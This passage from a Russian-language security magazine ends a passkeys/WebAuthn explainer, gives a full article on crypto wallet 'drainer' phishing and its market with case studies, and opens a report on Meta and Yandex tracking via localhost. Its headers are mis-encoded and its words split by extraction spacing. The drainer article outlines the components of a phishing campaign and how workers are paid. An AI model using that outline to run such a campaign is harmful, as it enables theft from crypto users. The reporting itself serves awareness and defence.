 3. Аутен тифика тор проверя ет логин, пароль и присутствие пользовате ля.
 4. Аутен тифика тор воз вращает под писанный ответ.
 5. Бра узер отправляет этот ответ на сайт для провер ки.

Вза имо действие между бра узером и устрой ством аутентификации описано
подробнее в другой спе цификации — протоколе  Client  to  Authenticator
Protocol (CTAP) от FIDO Alliance. Мы сей час упрощаем для ясности; специфи -
кация WebAuthn предоставляет больше вари антов исполь зования (нап ример,
все может происходить в мобильном приложении вмес то сайта или браузе -
ра). Но эти детали для общего понимания механиз ма не так важны.


ÇÀÙÈÒÀ ÎÒ ÔÈØÈÍÃÀ

WebAuthn решает проб лему фишинга с помощью привязки к источнику.
По спецификации браузе ры обязаны переда вать аутен тификатору информа -
цию об источни ке запроса, проще говоря — сообщать домен сайта. Аутен -
тификатор, в свою оче редь, исполь зует passkeys только в том случае, если
сайт, с которого пришел запрос, сов падает с тем, что создал этот самый
ключ.
   Это значит, что, если ты соз дашь ключ дос тупа для bank.com, фишин говый
сайт на fake-bank.com прос то не сможет его использовать — твой аутен -
тификатор откажется выполнять зап рос. Каж дому сайту выдается своя уни -
кальная пара клю чей, что полностью реша ет проблему повторно го исполь -
зования паролей.
  Спецификация допус кает только зап росы от источников, которые исполь -
зуют HTTPS. Это значит, что запрос исходит от сервера с действи тельным
сертифика том для нужного источника.


ÂÈÄÛ ÀÓÒÅÍÒÈÔÈÊÀÒÎÐÎÂ

В общем слу чае аутен тифика тор — это «что-то, что у тебя есть». Аутентифика -
торы поз воля ют проверять, реально ли пользователь присутствует в момент
аутентифика ции. Некоторые из них могут еще про верить пользовате ля
по  прин ципу  «что-то,  что  ты  зна ешь»,  например  зап росив  PIN-код,
или попытать ся убедить ся, что ты тот, кем явля ешь ся, при помощи биомет -
рии.
  Су ществу ет два основных типа аутентификаторов:
 1. Àóòåí òèôèêàòîðû ïëàò ôîðìû. Они оби тают прямо внутри тво его гад -
   жета.
    • Ïðèìåðû: iCloud Keychain, Google Password Manager, Windows Hello,
      1Password.
    • Ïëþ ñû: удобс тво исполь зования, час то предус матривают облачное
     резервное копиро вание.
    • Ìèíóñû: уязвимы, если сам девайс под угрозой компрометации.
 2. Ïå ðåíîñ íûå  àóòåí òèôèêàòîðû. Это отдельные специали зиро ванные
   устрой ства.
    • Ïðèìåðû: YubiKeys, Titan Security Keys, Feitian-брелоки.
    • Ïëþ ñû: мак симальная защита, устойчивость к взлому устройства.
    • Ìèíóñû: легко потерять или сломать, бэкапа обычно нет.

Если  плат форма  уме ет общаться  с  другими  устройствами,  например
по Bluetooth, ее аутентифика торы можно использовать как переносные.
Но если речь идет о суперважных при ложениях, лучше вооружить ся спе циаль -
ными железками — аппарат ными ключами безопас ности.
  Некоторые   аутен тификаторы  показы вают   тебе   детали   зап роса,
для которого они генери руют цифровую под пись. Если же аутен тификатор
не может этого сделать, браузер отобразит эти данные за него. Всегда про -
веряй эту информацию, преж де чем одобрять запрос на аутентификацию.


ÕÐÀÍÅÍÈÅ ÊËÞ×ÅÉ

Когда юзер регис три руется на сай те с помощью passkeys, аутен тификатор
соз дает ключ и идентифика тор (так называ емый credential ID). Сайт хранит
пуб личный ключ и идентифика тор, связывая их с аккаунтом пользователя.
Таким обра зом, сайт может использовать идентификатор, чтобы сообщить
аутентифика торам, какой именно ключ они хотят дос тавить.
   У некоторых аутентификаторов боль шие хранилища, и они сами содержат
все поль зователь ские ключи. Другие этого сделать не могут, поэтому они
шифруют ключ и переда ют зашифрованный вари ант сайту как идентификатор
во вре мя регистрации.
   Ког да сайт хочет провес ти аутентифика цию пользовате ля, он шлет этот
иден тифика тор в браузер, а тот — в аутентифика тор, который, в свою оче -
редь, рас шифровыва ет его и использует пароль ный ключ.
   То есть сайт, может быть, и хра нит ключ, но, так как ключ зашифрован,
в слу чае взлома сай та злоумышленником поль зовате лю это никак не нав -
редит.


ÄÎÂÅÐÈÅ Ê ÓÑÒÐÎÉÑÒÂÀÌ

Теоре тичес ки ты можешь прос то сохранить пару криптографичес ких клю чей
в файл, написать какой-нибудь софт, который будет исполь зовать эти клю чи
для криптогра фических операций, и выдать это за аутентификатор. Как сай -
там убедить ся, что их пользователи при меняют надежные аутентификаторы?
   Аутен тифика торы могут криптографичес ки доказать некоторые фак ты
о сво ем про исхождении (нап ример, кто их производитель), соз давая аттеста -
цион ное заяв ление, когда поль зователь генерирует ключ доступа. Это заяв -
ление под твержда ется цепоч кой сертификатов, подписанных производите -
лем. Это особен но полезно в корпоратив ной среде, потому что поз воляет
убедиться, что все исполь зуют спе цифичес кие аутентификаторы, которые
соот ветству ют определенным требованиям безопас ности.
  Од нако аттестация не обязатель на: спецификация WebAuthn не требует
от аутентифика торов поддержки этой функции.


ÏÎÒÅÐß ÄÎÑÒÓÏÀ

Что делать, если ты потерял свой аутентификатор или он сломался? Со всеми
клю чами, которыми он управлял, можно распрощаться. Пос кольку это случай -
но сге нери рованные крип тографичес кие пары, вернуть их уже не получит ся.
   Боль шинство платформенных аутентификаторов типа iCloud Keychain,
Google Password Manager и 1Password дают воз можность залить клю чи
в облако. Но это, конечно, компромисс: вос ста новимые ключи име ют боль -
шую зону риска, ведь зло умышленни ки могут попытаться стащить их через
механизм восста новления.
  Короче говоря, важ но, чтобы сайты имели воз можность для восстанов -
ления доступа, когда ты теря ешь свои ключи, но при этом не сто ит забывать,
что именно к этой лазей ке могут под красться атакующие.


ÄÐÓÃÈÅ ÐÈÑÊÈ

Использование плат форменных аутентификаторов с возможностью резер -
вно го копирования, конеч но, сни жает риск потери ключей дос тупа, но не
устраняет его. Если тебя забанят на плат форме, прощайте, ключи. А еще
плат форма может слу чай но потереть их. Плюс быва ет поддержка шейринга
клю чей с семьей, где нес колько человек могут пользоваться общими клю -
чами, — это тоже соз дает рис ки. Сайт обязательно должен предупреждать
обо всем этом.


ÌÎÄÅËÜ ÓÃÐÎÇ

Passkeys — это, конечно, не уни вер саль ное решение для безопас ности.
Давай раз беремся, от чего они действи тельно защищают.
  Модель угроз для passkeys показы вает, что они защищают от тех же угроз,
что и стандартные пароли, но при этом устра няют риск фишинга и повторно го
исполь зования паролей. Раздел Conformance в спецификации WebAuthn
дела ет очень силь ное заявление о том, что сай ты, браузе ры и аутентифика -
торы, соответс твующие специфи кации, считают ся «защищенными» от зло -
намеренных действий.
  Но это немного упро щенная картина. Вот нес колько вполне реальных атак,
которые все еще могут произой ти:
 • Àòàêè ÷åðåç áðàóçåð. Некоторые аутентифика торы, например YubiKey
   5C, не имеют встроенного дис плея и пол ностью полагаются на браузер,
   что бы показать тебе, на каком сай те ты аутентифицируешься. Если твоим
   бра узером завладеет малварь или вре донос ное расширение, он может
   показывать тебе «google.com», в то время как на самом деле отправляет
   твоему аутентифика тору зап рос для подписи от «attacker.com».
 • Ñêîìïðîìåòèðîâàí íûå   àóòåí òèôèêàòîðû.   Устойчивость  паролей
   зависит от того, насколько хорошо аутентификатор защищает приватные
   клю чи. Под дель ный ключ, зараженное ПО аутентификатора или малварь,
   изобража ющая встроенный аутентификатор ОС, могут тайком вытащить
   твои при ватные клю чи. Например, покупая якобы YubiKey у ненадежного
   продав ца, ты можешь нарваться на устройство, рас сылающее копии твоих
   клю чей кому-то еще.

Passkeys — шту ка классная, но они не спа сут, если на твой девайс уже попала
малварь или спайварь. Зато они работают как неп лохие ограничители ата -
ки — каждый раз, когда злоумышленник захочет что-то под писать, потребу -
ется отдельное взаимодей ствие поль зователя с аутентификатором. Кроме
того, ключи дос тупа не защищают от зло умышленников, которые могут кон -
тролиро вать домен сай та.
  Еще одна тон кость, которую сто ит учесть владельцам сай тов, — это кол -
лизии ID учетных записей. Специфи кация требует, чтобы они были ве роят нос -
тно уни каль ными . Это значит, что они генерируются слу чайно с очень малень -
ким, но все-таки не нулевым шансом на дублирование, как это бывает с UUID.
  Почему это важно? Когда пользователь регис три рует ключ доступа, сайт
сохраня ет ID дан ных для идентифика ции этого клю ча. Если хакер сможет
каким-то образом зарегис трировать ключ с таким же ID, как у жер твы, то
это вызовет путани цу при аутентифика ции.
   Это может показаться маловероятным, но представь себе такие сце нарии:
 • Злоумышленник, который раз добыл ID учетных данных жертвы (скажем,
   выудив из сетевого тра фика), может попытать ся зарегистрировать собс -
   твенный ключ доступа с этим же ID.
 • Вредоносное приложение для аутентифика ции может намеренно генери -
   ровать дуб лиру ющие ID учетных данных вместо того, чтобы соблюдать
   протокол о слу чай нос ти.
 • Ба ги в реализации могут сок ратить степень случайности при создании ID
   учетных данных.

Ре шение простое: сайты должны всегда откло нять попытки регис трации , если
ID нового ключа уже совпадает с тем, что есть в базе дан ных. Это создает
простую защиту по принципу «кто успел, тот и съел» против кон фликтов иден -
тификаторов.


ÐÀÑØÈÐÅÍÈß

WebAuthn позволяет сайтам запрашивать допол нительные функции (рас-
ширения) при создании ключей или входе в аккаунт. Если браузер и аутен -
тификатор под держи вают нужные рас ширения — они их применят. Если
нет — прос то проигнорируют, и все будет работать как обычно.
  В спецификации WebAuthn перечислены стандартные расширения, а за
дополнитель ными можно обратиться к специальному реес тру IANA. Рас -
ширения быва ют разные: одни нужны для сов местимости со старыми сис -
темами, другие добав ляют новые криптовоз можнос ти. Мы поговорим имен но
про вторую груп пу.


Ïñåâäîðàíäîìíàÿ ôóíêöèÿ (PRF)
Одна из таких фич — это PRF. Она соз дана на базе расширения hmac-secret ,
как написа но в FIDO CTAP v2.1. С помощью расширения PRF твой аутен -
тификатор может рас счи тывать HMAC-SHA-256, исполь зуя фиксированный,
случай но сгенери рованный 32-байтовый ключ HMAC. Для этого он берет хеш
SHA-256 от заранее определенного пре фик са WebAuthn и добавляет вход ные
данные с сай та.
   Хотя эта фича недостаточно гибкая, чтобы развернуть что-то вроде HKDF
(HMAC-based Key Derivation Function), ее можно использовать, чтобы реали -
зовать HKDF Extract — получе ние стой кого ключа из нестабильного источни -
ка.


Large Blob
Еще одно такое расширение называ ется Large Blob и позволяет аутентифика -
торам хра нить блоб неп розрач ных данных, которые сайт способен читать
или записы вать во время проверки под линнос ти. Сайт может использовать
это для хранения любых (в том чис ле чувс тви тель ных) дан ных, таких как сер -
тификаты или крип тографичес кие ключи.


ÏÎÒÅÍÖÈÀËÜÍÛÅ ÏÐÎÁËÅÌÛ

Достичь истинной  сквозной безопасности  в браузе ре крайне слож но,
а зачас тую невозможно. Ведь веб-криптогра фия работает на JavaScript,
который заг ружается с сервера, и это зна чит, что злонамерен ный сер вер
может  отпра вить  вредоносный  JavaScript,  который  вытаскивает ключи,
отправляет рас шифрованные сообщения обратно серверу и так далее.
  Еще хуже, злонамеренный сер вер может отправлять кор рек тный JavaScript
боль шинс тву пользователей, а вре донос ный — конкретной целевой жертве.
Внедрение механиз ма целос тнос ти для кода в интернете (например, хра -
нение хеша всех опубликованных вер сий у доверен ной третьей стороны)
и техники прозрачнос ти бинарных файлов (например, публично проверя -
емый, с видимостью попыток под делки  лог) — два многообе щающих
решения этой проб лемы.
  За меть, спецификация говорит, что все расширения опциональны. Значит,
нет никакой гаран тии, что бра узе ры и аутентификаторы их поддерживают.
Поэтому сай ты должны проверять, дос тупны ли нужные расширения, иначе
юзеры  столкнутся с проб лемами при дос тупе  к сервисам. Наде емся,
в будущем все основные браузеры и аутен тификаторы добавят эту фичу.
  Спецификация активно развива ется, и на горизон те куча крутых рас -
ширений. Среди возможных фич — новые крип тографические примитивы,
такие  как прод винутые  схемы циф ровых под писей или доказательства
с нулевым раз гла шени ем. Зас лужива ют вни мания и монотон ные счетчики —
механизм, защища ющий зашифрованные фай лы в облаке или на внешнем
хра нили ще от отка та к прошлым сос тояниям.


ÂÛÂÎÄÛ

Сей час самое вре мя переходить на passkeys. Их криптографическая основа
дает хорошие гарантии безопасности, так что это отличный выбор для сов -
ременных систем аутентификации — естественно, при правильной реали -
зации с использованием WebAuthn.
  Конеч но, это не панацея, но passkeys сни мают кучу серьезных проб лем,
от которых пароли стра дали годами: они не переда ют на серверы конфиден -
циаль ную информа цию, их не получится переисполь зовать на разных сай тах,
да и от фишинга защища ют бла годаря при вязке к домену.
   Как пользователь — переходи на клю чи доступа и осва ивай новый стан -
дарт. Аппаратные клю чи безопасности — твое луч шее оружие для защиты
особо цен ных приложений. Аутентифика торы на устройстве — это удобно,
и есть возможность делать бэкапы. Когда вхо дишь с ненадежных устройств,
исполь зуй ключи дос тупа с другого устройства, которое имеет свой дисплей,
чтобы контролировать запросы на авториза цию.
   Ес ли ты раз работ чик, обеспечь поддер жку ключей доступа по мак симуму.
Не забудь под готовить механизмы восста новления аккаунта, так как при уте -
ре passkeys невоз можно вернуть. Даже встроенные аутентификаторы с фун -
кци ей резервного копирования несут определен ные риски, о которых нужно
знать.
   Passkeys могут быть и первым фактором аутентификации, и вторым , и даже
нес коль кими сра зу. Но разработчикам стоит учи тывать их в рам ках общей мо -
дели угроз .
   Чтобы защититься от зло наме ренных серверов, например в приложениях
с E2EE, внедряй методы целостнос ти подресурсов и прозрачности исполня -
емых фай лов. WebAuthn не стоит на мес те — новые расширения открывают
боль ше крип тографичес ких возможностей, но учти: поддер жка может отли -
чать ся в раз ных браузе рах и аутентифика торах.
ПРИВАТНОСТЬ





Дрейнеры — новый  захлес тнувший мир
крип товалют вид фишинга. Он растет удар -
ными темпами и уже обошел рансомварь
по рас простра ненности и объемам укра -
денного. Я попытался разоб рать ся в осо -         Pr0xyFac3@proton.meProxyFace
бенностях  работы  дрейнеров,  а  также
устройстве вырос шего вок руг них рынка.
Об этом сегодня и поговорим.


Главная цель ата кующе го в любой фишинговой кампании — это под ловить
пользователя на ошиб ке, сделать так, что бы тот выдал информа цию, которую
выдавать посторон ним не должен. В слу чае с дрейнерами — заставить поль -
зовате ля дать смарт-контракту разрешение вза имодей ствовать со своими
средства ми.




                   В основном дрейнеры направлены на работу
                        с блокчей нами со смарт-контрактами и атакуют
                       пользователей Ethereum-подоб ных сетей: самого
                        Ethereum,  Base,  Polygon,  Optimism и про чих.
                    Но встречаются дрейнеры для Solana, а недавно
                       появил ся и дрейнер, ориентированный на Bitcoin.


Представь, что ты хочешь под ключить свой кошелек MetaMask на сайте
какого-то проекта, чтобы получить немного крип ты. Скажем, ты хочешь при -
обрести новый токен, пока он дешев. Ты нажимаешь кнопку Connect, вводишь
свой пароль и подписываешь транзакцию — апрув на доступ к кошельку.
   Тут-то тебя и ловит дрейнер: дела ет так, чтобы вместо легитимного кон -
тракта на получение токенов ты подписал вредоносный смарт-контракт и тем
самым дал раз решение на трансфер всех сво их средств. Получается, ты сам
соглашаешься отдать все свои деньги!
   Как так может получиться? Лучше все го это работает на эйрдро пах — раз -
дачах новых токенов. На них слетает ся множес тво желающих получить нем -
ного крип ты, которая потом может вырасти в цене в десятки раз. Такие раз -
дачи дей стви тель но иногда устраивают, чтобы прокачать тот или иной новый
токен. В этот момент пользователя гонит то, что называется FOMO, — чувс -
тво, что он может упустить выгоду.
  Че ловек в спеш ке может не проверить, кем соз дана страница, с которой
он вза имодейству ет, и что конкретно дела ет смарт-кон тракт, раз решение
которому он выдает. Сайт же при этом может быть полностью скопирован
злоумыш ленником с нас тояще го, а смарт-контракт — забирать день ги вмес то
того, что бы их давать.


ÄÐÅÉÍÅÐÛ ÍÀÁÈÐÀÞÒ ÎÁÎÐÎÒ

В 2024 году слу чилось интерес ное событие: дрей неры обогнали по темпам
распространения и выручке обычные шиф ровальщики. Рансомварь, конечно,
продол жает быть бичом крупного биз неса, но скамеры устре мились в новые,
пока не занятые ниши.
  Са мые первые дрей неры распространялись в качестве скриптов на дар -
кнет-площад ках. По данным «Лабора тории Касперского»,  в 2022  году
было 55 уникаль ных форумов, на которых встречались дрейнеры. В 2024 году
таких мес течек было уже 129. То есть рост более чем в два раза за два года.





        Рост уникаль ных дар кнет-форумов с темами про дрейнеры

И это только для такого специфи чес кого и пус товатого, по сути, места,
как дарквеб. В основном все вза имодействие сей час происходит в Telegram
и Discord.
  Са мые крупные дрейнеры, которые были активны в 2024 году, — это Angel,
Inferno, Ping, Ace, Cerberus, Nova, Medusa, MS, CryptoGrab и Venom. Из них
сей час активны в основном Angel и Ace, но зато появился новый игрок —
Vanilla. Пока он не очень исследован, поскольку работает по приватной
модели: получить дос туп к нему рядово му скамеру тяжело.
  По данным компании Scam Sniﬀer, которая занима ется ана лизом видов
мошен ничества в криптовалютах, за 2024 год общие потери от дрейнеров
составили 494 мил лиона дол ларов.





И это только крупные кейсы взло мов, которые уда лось посчитать! Поскольку
дрей неры направлены на обыч ных пользователей, маленькие кражи вроде
нес коль ких тысяч долларов в эту ста тис тику даже не попада ют. Так что
это лишь ниж няя гра ница.
  Среди больших компаний в 2024 году — более 330 тысяч жертв. Рекор -
дная кража за тот год — 55 миллионов дол ларов. Всего крупных мошен ничес -
ких кампаний было около 30 — в полтора раза боль ше, чем в 2023 году.
  В первом квартале 2024 года дрей неры показа ли рост почти в шесть раз.
В то же время рынок рансомвари увеличился только вдвое.





  Темпы рос та дрейнеров по количеству украденных средств в сравнении
  с ран сомварью

Что озна чают эти цифры? Из-за прос тоты вхо да в эту индустрию сюда
устремляются мошенники, которые занима лись фишингом по email, замани -
вая на поддель ные страницы банков, и промышляли прочими традиционными
видами ска ма.
  Направив свои навыки на криптовалютчиков, они смогли получить безум -
ные  профиты.  Даже  рядовой  работя га  здесь  может  «зарабатывать»
от 100 тысяч долларов.
   Ка жет ся, что пара месяцев такого труда могут обеспечить квар тирой,
машиной и регулярным отпуском в Таиланде. Разок рис кнул, и можно
выходить из игры! Но, конечно, почувс твовав вкус наживы, ник то через два
месяца из этого биз неса не уходит.


ÏÎ×ÅÌÓ ÝÒÎ ÏÐÎÑÒÎ

Если рансомварь нацелена в первую очередь на компании, то дрейнеры ата -
куют простых поль зователей и потенциаль но могут дотянуться до любого, кто
вза имодействует с крип товалютами.
  Дрейнеры ста ли очень популярными имен но из-за широкого охвата
и простоты перехода в эту область. Плюс ска зыва ется, что в крип те вер тятся
серь езные день ги и поль зователи при выкли ими легко распоряжаться.
   Рансомварщику приходит ся связываться с компанией, тор говать ся, орга -
низо вывать переда чу денег и рас шифровку — это доволь но мно го мороки.
Дрейнер же кра дет день ги сразу.
   Как и многие дру гие виды скама, дрейнеры рас пространяют ся по модели
SaaS — Software-as-a-Service. Их даже называют DaaS, то есть Drainer-as-a-
Service.
  Происходит и характерное раз деление работы. Есть разработчики (те, кто
дела ет малварь) и вор керы (рядовые работники), а также рек рутеры, спе -
циалис ты по нагону тра фика и пос тавщи ки самых раз ных сопутс тву ющих
услуг.
   Главную задачу, конеч но, выпол няют раз работчики: они создают вре -
донос ное ПО, делают его более удобным для исполь зования, лег ким в раз -
верты вании и масштабировании. В целом, если отвлечься от криминаль ной
сущ ности, это обычный ИТ-продукт.


ÊÀÊ ÑÎÇÄÀÅÒÑß ÊÀÌÏÀÍÈß

Что дела ет зло умышленник, чтобы такое провернуть? Вот что ему нуж но, что -
бы устроить фишинговую кам панию:
 • домены для будущих сайтов, похожие по написа нию на наз вание копиру -
  емого про екта;
 • хос тинг — мес то, где будет помещен сайт;
 • лендинг — стра ница, похожая на легитимный проект;
 • код дрейнера (как правило, это JS-код, который будет хранить ся на сайте);
 • па нель управле ния, которая позволит знать, сколь ко поль зовате лей уда -
   лось заманить на страницу, и отслеживать их поведение;
 • средс тва собствен ной безопас ности: VPN, Proxy, SockPuppet-аккаунты.

Про фес сиональ ные злоумышленни ки обычно ставят пол ноценный C&C-сер -
вер, позволяющий контролировать поведение дрей нера.
  Ос тает ся  только  при вес ти  людей.  Этим  занимаются  спе циалисты
по арбитражу тра фика, они же тра фико воды. Их задача — направить поль -
зовате лей на фишинговую страницу. Делается это по-раз ному: от рекламы
в Google до непосредс твенного взаимодей ствия с самими пользовате -
лями — в ком мента риях и пос тах. Бывает, что мошенники даже клониру ют
официаль ные каналы под дер жки легитимных про ектов.
  В результате у злоумышленников получается самая настоящая воронка
продаж — выстраивает ся путь, который проходят жер твы.




20–30% укра денного получа ют операторы, остальное — воркеры, те, кто
непос редс твенно ска мит людей. От ква лификации вор керов зависит их при -
быль. Начина ющие отдают 30%, самые опытные — 10–15%.
   Ква лифи кация воркера оценивается по тому, сколько он уже украл. В пре -
делах 10 тысяч долларов — начина ющий, в пре делах 25–50 тысяч — мидл,
от 100 тысяч (обычно миллион и больше) — профессионал.



ÍÀÃÎÍ ÒÐÀÔÈÊÀ

Зна ния в сре де воркеров распростра няются через туториалы. Туториал —
это предмет покупки, продажи и обмена. Ради доступа к туториалам создают -
ся сообщес тва.
  Мне удалось най ти нес колько таких туториалов. Занят ный момент: по тек -
сту хорошо вид но, что при написа нии не обошлось без нейросетей.
  В целом здесь применяется та же схема привода трафика, что и в обыч -
ном фишинге, — прос то с некоторой поп равкой на криптовалюты.
  Воркер, по сути, выполняет ту же работу, что и любой специалист по рек -
ламе в сети. Его цель — уве личить чис ло людей, переходящих на фишинговые
стра ницы. Для этого нужно искать пользователей, которые интересуются про -
екта ми в области Web3 и DeFi, име ют криптокошель ки и заинтересованы
в эйрдропах, свопах (обменах токена ми) и обменни ках.
  В ход идет демографический ана лиз, анализ геолокаций, то есть, по сути,
обычный, зна комый всем рекламщикам тар гетинг. Также вор керы занимаются
«дизай ном сай тов» — клонированием страниц существующих проектов.
Даль ше в ход идут даже такие при емы из маркетинга, как А/Б-тестирование.
  Давай теперь пройдем ся по громким примерам увода средств дрей -
нерами.


ÀÒÀÊÀ ÍÀ ARKHAM INTELLIGENCE

Компания Arkham занима ется предос тавле нием ана литики на блок чейне.
Это популярный инструмент, который поз воля ет отсле живать тран закции.
Нап ример, его используют трейдеры, чтобы знать, сколько стоит актив и где
он торгует ся.
  В 2023 году владель цы Arkham выпустили свой токен и запустили эйрдроп
монет. Одна ко злоумышленни ки создали мно жес тво поддельных профилей
в X.com, чтобы перенаправить пользовате лей на фишин говые страницы
с дрей нером.
  Боты были живучие и подол гу не попадали под блокировки. Они изоб -
ражали активность Arkham и рас пространяли вре доносные ссыл ки.
   Страница по этим ссылкам была неотличима от сайта Arkham, с той раз -
ницей, что на поддель ном сайте не работа ла ни одна кноп ка, за исключени ем
Wallet Connect — под ключения кошель ка.
  Ис сле дование показало, что при атаке использовал ся Angel  Drainer.
Занятный момент: в настройках кли ентского JS-кода содер жалась строч ка
«Angel Drainer is the best».
   Таких поддель ных сай тов создавалось огромное количество, срок их жиз -
ни — недели, мак симум — месяцы. ПО Angel поз воляет быстро копировать
лендинги и раз мещать их на новых доменах. Процесс упро щен нас только, что
воркеру для раз верты вания нового сай та дос таточно ввести всего несколько
команд в диало ге с ботом в Telegram.


ÀÒÀÊÀ ÍÀ SEC

Еще большего мас штаба можно добиться, захватив настоящий аккаунт
какой-то авторитет ной компании или даже государствен ной организации.
  При мер — история, которая произошла с американской Комиссией
по ценным бумагам и бир жам (SEC). 9 янва ря 2024 года ее аккаунт в X.com
зах ватили при помощи сим-свопинга — перевыпуска сим-карты, к номеру
которой был привязан акка унт. Чинов ники, позабыв про безопасность,
не вклю чили на акка унте мно гофакторную аутентификацию.




                   В последнее вре мя сообщества сим-своперов
                      и дрейнеров сильно сблизились. Своперы мас -
                       сово пре доставляют дрейнерам угнанные акка -
                         унты.


Злоумышленники опубликова ли пост о том, что SEC официально разрешает
инвестировать в  Bitcoin без покупки крипты нап рямую на бирже вроде
Binance или Coinbase.





Это выз вало ажиотаж, потому что инвесторы давно ждали такого решения
от SEC и рас считыва ли, что оно будет принято бук вально на днях. Следом
хакеры при зыва ли получить официальный эйрдроп от SEC — на спе циальном
сай те, который содержал дрей нер.
  При меча тельно, что пуб ликация даже вызвала ска чок курса Bitcoin — он
поднялся на тысячу долларов.


ÀÒÀÊÀ ÍÀ LOTTIE-PLAYER

Бывает, что дрейнеры рас пространяются не как прос той фишинг, а в резуль -
тате хакерской атаки. В качестве при мера можно вспом нить исто рию с Lottie-
Player. Это клас сичес кая supply-chain-атака, которую часто проворачивают
хакеры.
  В данном случае был атакован пла гин отрисов ки графики Lottie-Player. Его
часто под ключают на сай тах проектов Web3,  чтобы  делать анимацию
при помощи JavaScript.
  За раженными оказались версии Lottie-Player версий с 2.0.5 по 2.0.7.
В код, опуб ликованный в NPM, был встро ен бэкдор, который при помощи
специально сформированного JSON поз волял внед рять на легитимные сайты
Ace Drainer.





Про вернуть это получилось в резуль тате взлома аккаунта старшего раз работ -
чика Lottie-Player на GitHub. Ата кующие выкати ли три скомпрометирован ных
обновления все го за три часа.
  В итоге на сайты, где пользователям пред лагается подклю чить кошелек
вро де Trust Wallet или MetaMask, был внедрен код Ace Drainer, который вместо
коннекта к плат форме вымани вал разрешение на перевод всех средств.
  Од ной из основных жертв стала Web3-платформа 1inch, однако ее вла -
дель цы заявили, что в резуль тате ата ки пострадало только децентрализован -
ное при ложение (DAPP), тогда как приложение Wallet оста лось нетронутым.
  По сути, здесь хакер монетизировал свою работу по взлому аккаунта жер -
твы, купив и внед рив Ace Drainer (на что у обыч ных воркеров, конечно, не хва -
тило бы ума).


ÑÊÀÌ ÑÊÀÌÀ

Скамеры не были бы скамера ми, если бы не скамили и друг друга тоже.
Однажды разработчик дрейнера Pink Drainer почувство вал, что деанон близ -
ко, и решил вый ти из игры и вывести наг рабленное.
  Прос то так продать крипту, полученную в результате скама, нельзя. Чтобы
вывес ти средс тва, мошеннику сна чала нуж но их отмыть, иначе обменник
может заподоз рить неладное и заморозить деньги у себя.




                       Чтобы  не  позволять  спонсировать  терроризм
                      и нарушать закон, обменники исполь зуют скоринг
                      и не при нима ют «грязную» крип ту. Это называ -
                        ется AML-score (anti-money-laundering).


Сущес твует множес тво способов отмы ва, и в результате использования
одного из них Pink Drainer сам попал ся на скам.
  Он столкнулся с простей шим видом мошенничества, который называется
address poisoning. Это невероятно тупой вид атаки, но, как видишь, тоже
рабочий.
  Злоумышленни ки генерируют криптовалютные адре са, похожие на адрес
жертвы, и отправляют ей минималь ную сум му, чтобы адрес появился в исто -
рии тран закции.
  Для поль зователя этот выг лядит так: ты отправляешь, скажем, 100 дол -
ларов на какой-то дру гой кошелек (например, в обменник), а через 5–
10 минут тебе приходит нес коль ко крошечных переводов вроде бы с того же
самого кошелька, но в реаль ности лишь с похожим адре сом — например,
иден тичным началом и концом.
   Рас чет на то, что при сле дующем переводе жертва просто выберет пос -
ледний адрес из истории и отправит день ги не себе, а злоумышленнику.
  На этом и попался Pink Drainer — выбрал пос леднюю транзакцию и отпра -
вил 10 ETH (в тот момент око ло 15 тысяч долларов) какому-то неизвес тному
сорат нику.


ÇÀÊËÞ×ÅÍÈÅ

Из-за прос тоты и популярности дрей нин га этот вид скама будет встречаться
и дальше. При этом виды и способы раз мещения вре доносной наг рузки будут
усложняться.
  Дрейнеры все чаще ори ентируются на молодые блок чейны. В сетях
на осно ве Ethereum дей ствовать все сложнее, там появляются средства
защиты, которые при ходит ся обходить. В той же Solana подобных защит пока
нет.
   Бу дут появлять ся и новые виды дрейнеров — некоторые скамеры уже
начали делать вмес то сайтов при ложения для Google Play и App Store.
   Так что будь бдителен и думай дважды, преж де чем нажимать любые кноп -
ки!
ПРИВАТНОСТЬ





Ис следова тели выяс нили, что код, который Meta и «Яндекс»
ставят на миллионы сайтов, устраивает деанон юзеров, хит -
ро исполь зуя легитимные протоколы. Chrome и другие бра -
узеры втихаря шлют уникаль ные идентификаторы нативным
приложениям на устройстве. В этой статье — подробный
разбор того, как это работает.



Это близкий к тексту перес каз статьи « Meta and Yandex are de-anonymizing
Android users’ web browsing identiers » с сай та Ars Technica. Ее автор — Дэн
Гудин .
  В расследова нии учас твовали:
 • Аникет Гириш, аспирант в IMDEA Networks;
 • Гюнеш Акар, доцент группы цифровой безопасности и iHub в Универ -
   ситете Радбауд;
 • Нарсео Валлина-Род ригес, доцент IMDEA Networks;
 • Ни пуна Вирасе кара, аспи рант IMDEA Networks;
 • Тим Влуменс, аспирант в COSIC, Лёвенский католи ческий уни вер ситет.

Де ятель ность ком пании Meta Platforms признана экстре мистской и зап -
рещена в России.
   Facebook принадлежит компании Meta, деятельность которой приз нана
экс тре мист ской и запрещена на территории РФ.


Песочница Android изолирует процес сы, чтобы те не взаимодействовали
с ОС или другими при ложе ниями на устрой стве, отре зая дос туп к важ ным
данным и сис темным ресурсам. Меры защиты, такие как разделение сос -
тояния и разделение хранения , встро енные во все основные браузеры, кон -
тей неризу ют дан ные сай тов, защищая от покушений со стороны других сай -
тов. Одна ко это уда лось обойти.
  Скры тое отслежива ние через тре керы Meta Pixel и « Яндекс Метрики » поз -
воляет Meta и «Яндексу» обходить основные механизмы безопасности и кон -
фиденциаль ности как Android, так и браузе ров для этой ОС.


ÏÐÎÐÛÂ

«Один из основных принципов безопас ности в вебе и мобильных сис темах
называ ется песочницей, — объясняет в интервью Нар сео Валлина-Род ригес,
один из иссле дователей, нашед ших проблему. — Ты запус каешь все в песоч -
нице, и между разными эле ментами взаимодей ствия нет. Однако эта уяз -
вимость поз воляет обойти песоч ницу, которая отделяет мобильный контекст
от веб-контекста. Этот канал дает воз можность передавать информацию
о том, что происходит в бра узере, в мобильное при ложе ние».
  Байпас, который в «Яндексе» запус тили еще в 2017 году, а в Meta подхва -
тили прошлой осенью, позволяет компаниям прокидывать cookie и другие
иден тифика торы из бра узеров на базе Firefox и Chromium в нативные Android-
приложе ния Facebook, Instagram и раз ные при ложе ния «Яндекса». В резуль -
тате всю твою исто рию в бра узере можно свя зать с учет кой, под которой ты
залоги нен в при ложении.
  За мечено такое пока только на Android. Исследователи говорят, что
теоретичес ки схожим методом можно атаковать и iOS. Ведь браузеры на этой
плат форме поз воля ют разработчикам программно устанавливать соеди -
нения с localhost, а при ложе ния — отслеживать такие подключения.
  В отличие от iOS, Android дает боль ше возможнос тей для локаль ных ком -
муникаций и фоновой работы процес сов мобиль ных приложений. Meta Pixel
